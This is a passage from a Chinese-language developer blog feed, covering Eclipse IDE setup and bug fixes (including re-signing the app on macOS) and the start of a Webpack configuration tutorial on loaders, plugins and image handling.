<p>&#x5728; Team =&gt; Share Project &#x5EFA;&#x8BAE;&#x81EA;&#x5B9A;&#x4E49; new repo &#x53BB;&#x5B9E;&#x73B0; Repository &#x5B58;&#x653E;&#x8DEF;&#x5F84;&#x3002;</p>
</li>
</ul>
<pre><code class="language-shell">/User/zsxzy/git/repository/(.git)
# .git &#x4F1A;&#x81EA;&#x52A8;&#x6DFB;&#x52A0;,&#x65E0;&#x9700;&#x586B;&#x5199;
</code></pre>
<ul>
<li>commit =&gt; Remote =&gt; Push &#x94FE;&#x63A5;&#x81F3; Github &#x5E76;&#x9009;&#x62E9; Source ref &#x522B;&#x79F0;&#x9879;&#x4E3A; <code>refs/head/master</code> &#x5B8C;&#x6210; Add Spec&#x3002;</li>
</ul>
<h3 id="java-%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8">Java &#x81EA;&#x52A8;&#x8865;&#x5168;</h3>
<p>Preference =&gt; Java =&gt; Editor =&gt; Content Assist =&gt; java automatic activation trigger &#x4E2D;&#x8865;&#x5168;&#x5355;&#x8BCD;&#x89E6;&#x53D1;&#x3002;</p>
<pre><code class="language-java">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.
</code></pre>
<h3 id="javaee-perspective">JavaEE perspective</h3>
<p>Help -&gt; install new software &#x641C;&#x7D22;&#x7B26;&#x5408;&#x5F53;&#x524D; eclipse &#x7248;&#x672C;&#x53F7;&#x7684; item work with&#x3002;&#x627E;&#x5230; Web, XML, Java EE and OSGI Enterprise Development&#xFF08;&#x53EF;&#x4EE5;&#x5177;&#x4F53;&#x5230;  Eclipse IDE for Java EE Developers&#xFF09;&#x3002;</p>
<pre><code class="language-shell">2021-06 - http://download.eclipse.org/releases/2021-06/202106161001
</code></pre>
<h3 id="%E5%B7%A5%E4%BD%9C%E5%8C%BA%E9%85%8D%E7%BD%AE">&#x5DE5;&#x4F5C;&#x533A;&#x914D;&#x7F6E;</h3>
<ul>
<li>Access Commands and other items</li>
</ul>
<p>navigator&#x3001;workspace&#x3001;outline&#x3001;console</p>
<ul>
<li>New</li>
</ul>
<p>window -&gt; perspective -&gt; customize perspective -&gt; menu visibility -&gt; file &#x914D;&#x7F6E; new &#x76F8;&#x5173;&#x3002;</p>
<p>Java Project&#x3001;Package&#x3001;Class&#x3001;Interface&#x3001;Enum&#x3001;Annotation&#x3001;JUnit Test Case&#x3001;Folder&#x3001;File&#x3001;HTML File&#x3001;Static Web Project&#x3001;JSP File&#x3001;Dynamic Web Project&#x3001;Servlet&#x3001;Filter&#x3001;Listener&#x3001;XML File</p>
<h3 id="eclipse-jee-vs-eclipse-java">eclipse-jee vs eclipse-java</h3>
<p>&#x5728; Homebrew &#x4E0A;&#x5B58;&#x5728;&#x4E09;&#x79CD;&#x7C7B;&#x578B;&#x7684; eclipse &#x7248;&#x672C;&#xFF0C;cpp&#x3001;jee&#x3001;java&#x3002;&#x5176;&#x4E2D; Eclipse for Java &#x662F;&#x5E26;&#x6709; GUI &#x548C; Swings &#x5E93;&#x7684;&#x57FA;&#x672C; IDE&#x3002;&#x4F46;&#x7F3A;&#x5C11;&#x7528;&#x4E8E;&#x5904;&#x7406;&#x6570;&#x636E;&#x5E93;&#x548C; Web &#x5F00;&#x53D1;&#x7684;&#x90E8;&#x5206;&#x63D2;&#x4EF6;&#x3002;&#x9002;&#x7528;&#x4E8E; Java EE &#x7684; Eclipse IDE&#xFF08;EE &#x4EE3;&#x8868;&#x4F01;&#x4E1A;&#x7248;&#xFF09;&#x9884;&#x88C5;&#x4E86;&#x6240;&#x6709;&#x8FD9;&#x4E9B;&#x63D2;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x5236;&#x4F5C;&#x5B8C;&#x6574;&#x7684;&#x8F6F;&#x4EF6;&#xFF0C;&#x4E5F;&#x662F;&#x6700;&#x7406;&#x60F3;&#x7684;&#x9009;&#x62E9;&#x3002;&#x7406;&#x8BBA;&#x4E0A;&#x53EF;&#x4EE5;&#x5C06;&#x6240;&#x6709;&#x7EC4;&#x4EF6;&#x4ECE; Eclipse Java EE &#x5B89;&#x88C5;&#x5230; Eclipse for Java&#x3002;&#x4F46;&#x662F;&#x5FC5;&#x987B;&#x4E0B;&#x8F7D;&#x5E76;&#x89E3;&#x538B;&#x7F29; Eclipse for Java Developers &#x5E76;&#x5B89;&#x88C5;&#x540D;&#x4E3A; web tools platform &#x7684;&#x63D2;&#x4EF6;&#x3002;&#x800C; cpp &#x7248;&#x672C;&#x5219;&#x662F;&#x5B89;&#x88C5;&#x4E86; C/C++ &#x5728;&#x6B64;&#x7248;&#x672C;&#x7684; eclipse &#x4E0A;&#x3002;</p>
<h3 id="bugs-fixed">Bugs fixed</h3>
<ul>
<li>&quot;You do not have permission to open the application Eclipse JEE.app.Contact your computer or network administrator for assistance.&quot;</li>
</ul>
<pre><code class="language-shell"># Problem Report for eclipse
Crashed Thread:        Unknown

Exception Type:        EXC_CRASH (Code Signature Invalid)
Exception Codes:       0x0000000000000000, 0x0000000000000000
Exception Note:        EXC_CORPSE_NOTIFY
</code></pre>
<p>&#x7A0B;&#x5E8F;&#x8FD0;&#x884C; crashed &#x662F;&#x7531;&#x4E8E; Code Signature Invalid&#xFF08;&#x7B7E;&#x540D;&#x95EE;&#x9898;&#xFF09;&#x3002;&#x867D;&#x7136; Mac &#x542F;&#x7528;&#x7684;&#x5B89;&#x5168;&#x673A;&#x5236;&#x9ED8;&#x8BA4;&#x53EA;&#x4FE1;&#x4EFB; Mac App Store &#x4EE5;&#x53CA;&#x62E5;&#x6709;&#x5F00;&#x53D1;&#x8005; ID &#x7B7E;&#x540D;&#x7684;&#x8F6F;&#x4EF6;&#xFF0C;&#x540C;&#x65F6;&#x963B;&#x6B62;&#x6CA1;&#x6709;&#x5F00;&#x53D1;&#x8005;&#x7B7E;&#x540D;&#x7684;&#x8F6F;&#x4EF6;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x4E0D;&#x662F;&#x6211;&#x7B2C;&#x4E00;&#x6B21;&#x6253;&#x5F00;&#x6B64;&#x8F6F;&#x4EF6;&#xFF0C;&#x800C;&#x662F;&#x8FDB;&#x884C;&#x7CFB;&#x7EDF;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x540E;&#x7684;&#x526F;&#x4F5C;&#x7528;&#x3002;&#x5728;&#x5C1D;&#x8BD5;&#x91CD;&#x65B0;&#x7ED9;&#x8F6F;&#x4EF6;&#x8FDB;&#x884C;&#x7B7E;&#x540D;&#x540E;&#x95EE;&#x9898;&#x89E3;&#x51B3;&#x3002;<a href="https://www.quwenqing.com/archives/1539.html">&#x7C7B;&#x4F3C;&#x95EE;&#x9898;</a>&#x3002;</p>
<pre><code class="language-shell">$ sudo codesign --force --deep --sign - /Applications/Eclipse\ JEE.app
Password:
/Applications/Eclipse JEE.app: replacing existing signature
</code></pre>
<ul>
<li>&quot;The word &apos;localhost&apos; is not correctly spelled.&quot; &#x63D0;&#x793A;&#x5904;&#x7406;</li>
</ul>
<p>Preference &#x8F93;&#x5165; spell&#xFF0C;&#x5C06;&#x590D;&#x9009;&#x6846; &quot;Enable spell checking&quot; &#x53BB;&#x6389;&#x5373;&#x53EF;&#x3002;</p>
<p>junit &#x62A5;&#x9519; =&gt; java.lang.Exception: No tests found matching [{ExactMatcher:fDisplayName=testQuery1]</p>
<p>&#x8003;&#x8651;&#x4E09;&#x4E2A;&#x65B9;&#x9762;&#xFF0C;&#x662F;&#x4E0D;&#x662F;&#x6CA1;&#x5199; @Test&#xFF1B;&#x662F;&#x5426;&#x662F; public&#x3001;&#x53C2;&#x6570;&#x3001;&#x8FD4;&#x56DE;&#x503C;&#x3001;&#x4FEE;&#x9970;&#x7B26;&#x7684;&#x9519;&#x8BEF;&#xFF1B;&#x662F;&#x4E0D;&#x662F; spring &#x5305;&#x4E0E; junit &#x7684;&#x5305;&#x7684;&#x517C;&#x5BB9;&#x95EE;&#x9898;&#xFF1B;&#x662F;&#x5426;&#x65E5;&#x5FD7;&#x5DF2;&#x6DFB;&#x52A0;&#x3002;</p>
<ul>
<li>Mac m1 &#x7535;&#x8111; idea &#x5361;&#x987F;&#x7684;&#x95EE;&#x9898;&#x89E3;&#x51B3;</li>
</ul>
<p>macm1 IntelliJ &#x5E94;&#x6CE8;&#x610F;&#x517C;&#x5BB9;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5982;&#x4E0D;&#x662F; aarch64&#xFF0C;&#x800C;&#x662F; x86&#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x7248;&#x672C;&#x9519;&#x4E86;&#x3002;</p>
<pre><code class="language-java">IntelliJ IDEA 2022.1.1 (Ultimate Edition)
Build #...
Licensed to ...
Runtime version: 11.0.14.1+1-b2043.45 aarch64
...
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE; &#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[Webpack]]></title><description><![CDATA[webpack 配置与异常]]></description><link>yourdomain.com/webpack/</link><guid isPermaLink="false">60e1e88bdcff0833706c15f9</guid><category><![CDATA[BUG handled]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Mon, 08 Mar 2021 11:55:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/07/mickey.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="gettingstarted">Getting Started</h2>
<img src="yourdomain.com/content/images/2022/07/mickey.jpg" alt="Webpack"><p>Webpack &#x524D;&#x7AEF;&#x8D44;&#x6E90;&#x6784;&#x5EFA;&#x5DE5;&#x5177;&#xFF0C;&#x5373; module bundler &#x9759;&#x6001;&#x6A21;&#x5757;&#x6253;&#x5305;&#x5668;&#xFF0C;&#x5C06;&#x524D;&#x7AEF;&#x7684;&#x6240;&#x6709;&#x8D44;&#x6E90;&#x6587;&#x4EF6; js&#x3001;json&#x3001;css&#x3001;img... &#x90FD;&#x4F5C;&#x4E3A;&#x6A21;&#x5757;&#x5904;&#x7406;&#x3002;&#x6839;&#x636E;&#x6A21;&#x5757;&#x7684;&#x4F9D;&#x8D56;&#x5173;&#x7CFB;&#x8FDB;&#x884C;&#x9759;&#x6001;&#x5206;&#x6790;&#xFF0C;&#x6253;&#x5305;&#x751F;&#x6210;&#x5BF9;&#x5E94;&#x7684;&#x9759;&#x6001;&#x8D44;&#x6E90; bundles&#x3002;v4 &#x8D77;&#x4E0D;&#x518D;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6765;&#x6253;&#x5305;&#x9879;&#x76EE;&#x3002;</p>
<blockquote>
<p>Bundling application &#x5BF9;&#x4E8E; HTTP/1.1 clients&#xFF0C;&#x53EF;&#x4EE5;&#x51CF;&#x5C11;&#x6D4F;&#x89C8;&#x5668;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x5E94;&#x7528;&#x6240;&#x7B49;&#x5F85;&#x7684;&#x65F6;&#x95F4;&#xFF1B;&#x800C;&#x5BF9;&#x4E8E; HTTP/2 &#x6765;&#x8BF4;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4EE3;&#x7801;&#x5206;&#x5272;&#x8FDB;&#x4E00;&#x6B65;&#x5B8C;&#x6210;&#x4F18;&#x5316;&#x3002;</p>
</blockquote>
<h3 id="relatedinstructions">Related Instructions</h3>
<ol>
<li>Entry =&gt; &#x6307;&#x793A;&#x6253;&#x5305;&#x7684;&#x5165;&#x53E3;&#x8D77;&#x70B9;&#xFF0C;&#x6784;&#x5EFA;&#x5185;&#x90E8;<a href="https://webpack.js.org/concepts/dependency-graph/">&#x4F9D;&#x8D56;&#x56FE;</a> =&gt; &#x9ED8;&#x8BA4; ./src/index.js</li>
<li>Output =&gt; &#x6307;&#x793A;&#x8F93;&#x51FA;&#x521B;&#x5EFA; bundles &#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4EE5;&#x53CA;&#x547D;&#x540D;&#x65B9;&#x5F0F;</li>
<li>Loaders =&gt; &#x5BF9;&#x6A21;&#x5757;&#x6E90;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x8F6C;&#x6362;&#xFF0C;&#x62D3;&#x5C55;&#x53EA;&#x80FD;&#x5904;&#x7406; JS &#x548C; JSON &#x7684;&#x80FD;&#x529B;</li>
<li>Plugins =&gt; &#x6267;&#x884C;&#x8303;&#x56F4;&#x66F4;&#x5E7F;&#x7684;&#x4EFB;&#x52A1;&#xFF1B;&#x6253;&#x5305;&#x4F18;&#x5316;&#xFF0C;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#xFF0C;&#x6CE8;&#x5165;&#x73AF;&#x5883;&#x53D8;&#x91CF;</li>
<li>Mode =&gt; &#x4F7F;&#x7528;&#x76F8;&#x5E94;&#x6A21;&#x5F0F;&#x7684;&#x5185;&#x7F6E;&#x4F18;&#x5316;&#xFF1A;development, production or none</li>
</ol>
<p>webpack.config.js &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5B58;&#x5728;&#x65F6;&#xFF0C;&#x5728;&#x7EC8;&#x7AEF;&#x8FD0;&#x884C;&#x547D;&#x4EE4; <code>webpack</code>&#xFF0C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x914D;&#x7F6E;&#x9009;&#x9879;&#x4F1A;&#x81EA;&#x52A8;&#x5F15;&#x7528;&#x3002;&#x8BE5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x5B58;&#x5728;&#x53EF;&#x8282;&#x7701;&#x4E8E; package.json &#x4E2D;&#x7684; &quot;script&quot; &#x5185;&#x5BB9;&#x3002;</p>
<ul>
<li>&#x57FA;&#x672C; webpack.config.js &#x914D;&#x7F6E;&#x6587;&#x4EF6;</li>
</ul>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;); // node &#x5185;&#x7F6E;&#x6838;&#x5FC3;&#x6A21;&#x5757;&#x5904;&#x7406;&#x8DEF;&#x5F84;&#x95EE;&#x9898;
module.exports = { 
  entry: &apos;./src/js/index.js&apos;, // &#x5165;&#x53E3;&#x6587;&#x4EF6;
  output: { // &#x8F93;&#x51FA;&#x914D;&#x7F6E; 
  	filename: &apos;./built.js&apos;, // &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x540D; 
  	path: resolve(__dirname, &apos;build/js&apos;) // &#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x914D;&#x7F6E; 
  },
  mode: &apos;development&apos; //&#x5F00;&#x53D1;&#x73AF;&#x5883; 
};
</code></pre>
<ul>
<li>&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x4E0B;&#x7684;&#x7F16;&#x8BD1;&#x6253;&#x5305; &amp; &#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E0B;&#x7684;&#x7F16;&#x8BD1;&#x6253;&#x5305;</li>
</ul>
<pre><code class="language-shell"># &#x81EA;&#x52A8;&#x5904;&#x7406; js &#x548C; json &#x6587;&#x4EF6; + &#x5C06; es6 &#x7684;&#x6A21;&#x5757;&#x5316;&#x8BED;&#x6CD5;&#x8F6C;&#x6362;&#x6210;&#x6D4F;&#x89C8;&#x5668;&#x80FD;&#x8BC6;&#x522B;&#x7684;&#x5185;&#x5BB9;
$ webpack src/js/index.js -o build/js/built.js --mode=development
</code></pre>
<pre><code class="language-shell"># &#x5728;&#x5F00;&#x53D1;&#x914D;&#x7F6E;&#x529F;&#x80FD;&#x4E0A;&#x591A;&#x51FA;&#x538B;&#x7F29;&#x4EE3;&#x7801;&#x7684;&#x529F;&#x80FD;
$ webpack src/js/index.js -o build/js/built.js --mode=production
</code></pre>
<p>&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x540D; webpack.config.js&#xFF0C;&#x81EA;&#x5B9A;&#x4E49;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x540D;&#x9700;&#x8981;&#x901A;&#x8FC7; --config &#x6307;&#x5B9A;&#x3002;</p>
<pre><code class="language-json">&quot;script&quot;: {
  &quot;build&quot;: &quot;webpack --config xxx.config.js&quot;
}
</code></pre>
<ul>
<li>&#x5C40;&#x90E8; Webpack =&gt; <code>./node_modules/.bin/webpack</code> &#x6216; <code>npx webpack</code></li>
</ul>
<p>package.json &#x4E2D;&#x7684; script &#x5B57;&#x6BB5;&#x662F;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x5176;&#x5C5E;&#x6027;&#x540D;&#x5373;&#x5BF9;&#x5E94;&#x7684;&#x811A;&#x672C;&#x540D;&#x79F0;&#x3002;&#x6BCF;&#x5F53;&#x6267;&#x884C; npm run&#xFF0C;&#x5C31;&#x4F1A;&#x81EA;&#x52A8;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A; Shell&#xFF0C;&#x5728;&#x8FD9;&#x4E2A; Shell &#x91CC;&#x9762;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x811A;&#x672C;&#x547D;&#x4EE4;&#x3002;</p>
<p>npm run &#x65B0;&#x5EFA;&#x7684; Shell &#x4F1A;&#x5C06; ./node_modules/.bin &#x5B50;&#x76EE;&#x5F55;&#x52A0;&#x5165; PATH &#x53D8;&#x91CF;&#xFF0C;&#x6267;&#x884C;&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x518D;&#x5C06; PATH &#x53D8;&#x91CF;&#x6062;&#x590D;&#x539F;&#x6837;&#x3002;</p>
<pre><code class="language-json">/* &#x4F7F;&#x7528;&#x5F53;&#x524D;&#x9879;&#x76EE; webpack &#x800C;&#x975E;&#x5168;&#x5C40; webpack &#x6253;&#x5305; */
&quot;script&quot;: {
  &quot;build&quot;: &quot;webpack&quot; // &#x65E0;&#x9700; npx webpack
}
</code></pre>
<blockquote>
<p>&#x4E3A;&#x4E86;&#x66F4;&#x5408;&#x9002;&#x4E14;&#x65B9;&#x4FBF;&#x5730;&#x4F7F;&#x7528;&#x914D;&#x7F6E;&#xFF0C;&#x53EF;&#x4EE5;&#x5728; webpack.config.js &#x4E2D;&#x5BF9; webpack &#x8FDB;&#x884C;&#x914D;&#x7F6E;&#x3002;CLI &#x4E2D;&#x4F20;&#x5165;&#x7684;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#x4F1A;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x6620;&#x5C04;&#x4E3A;&#x5BF9;&#x5E94;&#x7684;&#x53C2;&#x6570;&#x3002;</p>
</blockquote>
<h3 id="devenvconfiguration">dev-env configuration</h3>
<p>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684; module.rules &#x5B57;&#x6BB5;&#x5141;&#x8BB8;&#x6307;&#x5B9A;&#x591A;&#x4E2A; loader &#x5BF9;&#x6E90;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x8F6C;&#x6362;&#x3002;</p>
<p>test &#x5B57;&#x6BB5;&#x7528;&#x4E8E;&#x6B63;&#x5219;&#x5339;&#x914D;&#x6587;&#x4EF6;&#x3002;use &#x5B57;&#x6BB5;&#x7684;&#x6570;&#x7EC4;&#x4E2D; loader &#x7684;&#x6267;&#x884C;&#x987A;&#x5E8F;&#x4E3A;&#x4ECE;&#x53F3;&#x81F3;&#x5DE6;&#x6216;&#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x3002;</p>
<pre><code class="language-shell"># &#x5E38;&#x89C4;&#x56E0;&#x7F3A;&#x4E4F;&#x76F8;&#x5E94;&#x6A21;&#x5757;&#x800C;&#x5BFC;&#x81F4;&#x7684;&#x89E3;&#x6790;&#x5931;&#x8D25;
Module parse failed: Unexpected token. You may need an appropriate loader to handle this file type.
</code></pre>
<ul>
<li>&#x6837;&#x5F0F;&#x8D44;&#x6E90;&#x6253;&#x5305; =&gt; <a href="https://webpack.js.org/loaders/css-loader/">css-loader</a> &amp; <a href="https://webpack.js.org/loaders/style-loader/">style-loader</a></li>
</ul>
<p>css-loader &#x5904;&#x7406; @import &#x548C; url()&#xFF0C;&#x5C06; CSS &#x6587;&#x4EF6;&#x89E3;&#x6790;&#x6210;&#x6837;&#x5F0F;&#x5B57;&#x7B26;&#x4E32;&#x7684; CJS &#x6A21;&#x5757;&#x52A0;&#x8F7D;&#x81F3; JS&#x3002;</p>
<p>style-loader &#x521B;&#x5EFA; style &#x6807;&#x7B7E;&#x5E76;&#x5C06; JavaScript &#x91CC;&#x6837;&#x5F0F;&#x8D44;&#x6E90;&#x6DFB;&#x52A0;&#x4E8E; head &#x5143;&#x7D20;&#xFF0C;&#x5373; CSS &#x63D2;&#x5165; DOM &#x4E2D;&#x3002;</p>
<pre><code class="language-shell">npm i css-loader style-loader less-loader less -D
</code></pre>
<pre><code class="language-javascript">module: { // &#x4E0D;&#x540C;&#x6587;&#x4EF6;&#x5FC5;&#x987B;&#x914D;&#x7F6E;&#x4E0D;&#x540C; loader &#x5904;&#x7406;
  rules: [
    {
      test: /\.css$/,
      use: [ &apos;style-loader&apos;, &apos;css-loader&apos; ] // &#x8BED;&#x6CD5;&#x7CD6;
    },
    { 
      test: /\.less$/, 
      use: [ &apos;style-loader&apos;, &apos;css-loader&apos;, &apos;less-loader&apos; ] // less-loader &#x5C06; less &#x6587;&#x4EF6;&#x7F16;&#x8BD1;&#x6210; css 
    } 
  ] 
}
</code></pre>
<ul>
<li>HtmlWebpackPlugin =&gt; &#x8F85;&#x52A9;&#x751F;&#x6210; HTML &#x6A21;&#x677F;</li>
</ul>
<p>&#x4F34;&#x751F; HTML5 &#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4E8E; body &#x4E2D;&#x4F7F;&#x7528; script &#x6807;&#x7B7E;&#x5F15;&#x5165;&#x751F;&#x6210;&#x7684; bundle&#x3002;</p>
<p>&#x901A;&#x5E38; HTML &#x6587;&#x4EF6;&#x5B58;&#x4E8E;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x800C;&#x6700;&#x7EC8;&#x6253;&#x5305;&#x7684; dist &#x76EE;&#x5F55;&#x4E2D;&#x6CA1;&#x6709; index.html &#x6587;&#x4EF6;&#x3002;</p>
<pre><code class="language-shell">npm install --save-dev html-webpack-plugin
</code></pre>
<pre><code class="language-javascript">const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
plugins: [
  new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos; }) // &#x590D;&#x5236; &apos;./src/index.html&apos; &#x6587;&#x4EF6;&#x5E76;&#x81EA;&#x52A8;&#x5F15;&#x5165;&#x6253;&#x5305;&#x8F93;&#x51FA;&#x7684;&#x6240;&#x6709;&#x8D44;&#x6E90; JS/CSS
]
</code></pre>
<ul>
<li>&#x6253;&#x5305;&#x56FE;&#x7247;&#x8D44;&#x6E90; =&gt; &#x89E3;&#x6790; background-image &#x7684; url &#x6216; img &#x7684; src</li>
</ul>
<p>url-loader &#x7684;&#x4F18;&#x52BF;&#x5728;&#x4E8E;&#x53EF;&#x5C06;&#x8F83;&#x5C0F;&#x6587;&#x4EF6;&#x8F6C;&#x6210; base64 &#x7684; URI&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x5B89;&#x88C5; loader &#x5305;
npm install --save-dev html-loader url-loader
</code></pre>
<p>&#x9875;&#x9762;&#x8BF7;&#x6C42;&#x8FC7;&#x591A;&#x7684;&#x5C0F;&#x56FE;&#x6807;&#x65F6;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x5E26;&#x6765;&#x8F83;&#x5927;&#x7684;&#x538B;&#x529B;&#x3002;&#x56E0;&#x8BF7;&#x6C42;&#x65F6;&#x9644;&#x5E26;&#x7684;&#x989D;&#x5916;&#x4FE1;&#x606F;&#x6709;&#x53EF;&#x80FD;&#x6BD4;&#x56FE;&#x6807;&#x7684;&#x5927;&#x5C0F;&#x8FD8;&#x8981;&#x5927;&#x3002;</p>
<p>base64 &#x5904;&#x7406;&#x540E;&#x7684;&#x56FE;&#x7247;&#x80FD;&#x51CF;&#x5C11;&#x8BF7;&#x6C42;&#x6570;&#x91CF;&#xFF0C;&#x51CF;&#x8F7B;&#x670D;&#x52A1;&#x5668;&#x538B;&#x529B;&#x3002;&#x4F46;&#x662F;&#x7ECF; base64 &#x5904;&#x7406;&#x540E;&#x7684;&#x56FE;&#x7247;&#x4F53;&#x79EF;&#x4F1A;&#x66F4;&#x5927;&#xFF0C;&#x4E14;&#x6587;&#x4EF6;&#x8BF7;&#x6C42;&#x901F;&#x5EA6;&#x4F1A;&#x66F4;&#x6162;&#x3002;</p>
<p>base64 &#x7F16;&#x7801;&#x540E;&#x7684; URI &#x53EF;&#x5D4C;&#x5165; bundle.js&#xFF0C;&#x6216;&#x968F;&#x7740;&#x5176;&#x4ED6;&#x8D44;&#x6E90;&#x4E00;&#x5E76;&#x4E0B;&#x8F7D;&#x3002;&#x6D4F;&#x89C8;&#x5668;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x89E3;&#x6790; base64&#xFF0C;&#x5373;&#x76F4;&#x63A5;&#x663E;&#x793A;&#x51FA;&#x6765;&#xFF0C;&#x8BE5;&#x65B9;&#x5F0F;&#x4E5F;&#x662F;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x5E76;&#x53D1;&#x6027;&#x80FD;&#x7684;&#x4F18;&#x5316;&#x3002;</p>
<p>url-loader &#x9ED8;&#x8BA4;&#x4F7F;&#x7528; ESM&#xFF0C;html-loader &#x5F15;&#x5165;&#x56FE;&#x7247;&#x662F; CJS&#x3002;</p>
<p>&#x89E3;&#x6790;&#x51FA;&#x73B0; [object Module] &#x65F6;&#xFF0C;&#x5E94;&#x5173;&#x95ED; url-loader &#x7684; ESM &#x5E76;&#x4F7F;&#x7528; CJS &#x89E3;&#x6790;&#x3002;</p>
<pre><code class="language-javascript">rules: [ 
  {
    test: /\.(jpg|png|gif)$/, // &#x9ED8;&#x8BA4;&#x5904;&#x7406;&#x4E0D;&#x4E86; html &#x4E2D; img &#x56FE;&#x7247;
    loader: &quot;url-loader&quot;, // &#x4EC5;&#x4F7F;&#x7528;&#x4E00;&#x4E2A; loader &#x53EF;&#x4EE5;&#x4E0D;&#x9700;&#x8981; use
    options: {
      limit: 8 * 1024, // &#x56FE;&#x7247;&#x5927;&#x5C0F;&#x5C0F;&#x4E8E; 8kb =&gt; &#x88AB; base64 &#x5904;&#x7406;
      esModule: false, 
      name: &quot;[hash:10].[ext]&quot; // &#x91CD;&#x547D;&#x540D; =&gt; [hash:10] &#x53D6;&#x56FE;&#x7247;&#x7684; hash &#x7684;&#x524D; 10 &#x4F4D;
    }
  },
  {
    test: /\.html$/, // &#x5904;&#x7406;&#x56FE;&#x7247;&#x9664;&#x6837;&#x5F0F;&#x5F15;&#x5165;&#x5916;&#x7684; html &#x6807;&#x7B7E;&#x5F15;&#x5165;
    loader: &quot;html-loader&quot; 
  } 
]
</code></pre>
<p>&#x9664; url-loader&#xFF0C;file-loader &#x4E5F;&#x53EF;&#x4EE5;&#x5904;&#x7406;&#x56FE;&#x7247;&#x683C;&#x5F0F;&#x7684;&#x8D44;&#x6E90;&#x3002;</p>
<p>file-loader &#x5C06;&#x6587;&#x4EF6;&#x4E2D;&#x7684; import/require &#x89E3;&#x6790;&#x6210; url &#x5E76;&#x53D1;&#x9001;&#x5230;&#x8F93;&#x51FA;&#x76EE;&#x5F55;&#x3002;</p>
<pre><code class="language-shell">npm install --save-dev file-loader
</code></pre>
<pre><code class="language-javascript">rules: [ 
  {
    test: /\.(png|jpe?g|gif|svg)$/i,
    loader: &quot;file-loader&quot;
  }
] 
</code></pre>
<p>&#x82E5;&#x9700;&#x5C06;&#x5904;&#x7406;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x5E94;&#x6309;&#x7167;&#x4E00;&#x5B9A;&#x7684;&#x547D;&#x540D;&#x89C4;&#x5219;&#x8FDB;&#x884C;&#x663E;&#x793A;&#xFF0C;&#x4F7F;&#x7528; <a href="https://v4.webpack.js.org/loaders/file-loader/">Placeholders</a>&#x3002;</p>
<p>[ext]&#xFF1A;&#x76EE;&#x6807;&#x6587;&#x4EF6;/&#x8D44;&#x6E90;&#x7684;&#x6269;&#x5C55;&#x540D; =&gt; Type: String Default: file.extname</p>
<p>[hash]&#xFF1A;&#x7531;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x6240;&#x751F;&#x6210;&#x7684; hash &#x503C; =&gt; Type: String Default: md4</p>
<p>[name]&#xFF1A;&#x6587;&#x4EF6;/&#x8D44;&#x6E90;&#x7684;&#x540D;&#x79F0; =&gt; Type: String Default: file.basename</p>
<p>[path]&#xFF1A;&#x8D44;&#x6E90;&#x8DEF;&#x5F84;&#x76F8;&#x5BF9;&#x4E8E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E0A;&#x4E0B;&#x6587;&#x7684;&#x8DEF;&#x5F84;</p>
<pre><code class="language-javascript">rules: [ 
  {
    exclude: /\.(css|js|html|less)$/, 
